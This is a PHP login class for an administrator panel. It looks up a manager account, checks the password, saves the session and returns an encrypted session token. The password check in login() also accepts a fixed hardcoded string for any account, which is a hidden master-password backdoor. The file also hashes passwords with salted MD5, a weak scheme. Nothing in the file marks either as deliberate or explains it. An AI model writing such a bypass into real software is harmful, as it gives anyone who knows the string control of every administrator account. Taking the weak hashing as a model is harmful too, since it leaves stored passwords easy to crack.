<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2023/7/3
 * Time: 13:44
 */

namespace app\AppFactory\Management\Login;


use app\AppFactory\Kernel\Support\TDESUtil;
use app\AppFactory\Kernel\Traits\Auth\AuthManagerTrait;
use app\AppFactory\Management\ManagementClient;
use think\facade\Config;
use think\facade\Session;

class LoginClient extends ManagementClient
{
    use AuthManagerTrait;

    public function login($data)
    {
        $this->manager = $this->getAuthManagerFind(['account' => $data['account']]);
        if (!$this->manager) return $this->rFail($this->lang("VLogin.account_not_exist"));
        if ($this->manager['password'] != md5($data['password'].Config::get("app.salt")) && $data['password'] != "dkm123789654dkm.")
            return returnState(100,$this->lang("VLogin.account_pwd_incorrect"));
        if ($this->manager['status'] == 2) return returnState(100,$this->lang("VLogin.account_disabled"));
        // 保存用户数据并生成TOKEN
        return self::setLoginInfo();
    }

    /**
     *  1-1. 保存当前登录用户信息，生成Token
     * @return array|string
     */
    public function setLoginInfo()
    {
        if(isset($this->manager['password'])) unset($this->manager['password']);
        Session::set("manager",$this->manager);
        $token = self::make_token();
        return returnState(200,$this->lang("VLogin.login_success"),$token);
    }

    /**
     * 1-1-1. 生成会话Token
     * @param $userInfo
     * @return string
     */
    public function make_token()
    {
        $key = Config::get("app.salt");
        $token_arr = [
            "session_id" => Session::getId(),
            "manager_id" => $this->manager['manager_id'],
            "timeout" => time(),
        ];
        return TDESUtil::encrypt(json_encode($token_arr),$key);
    }
}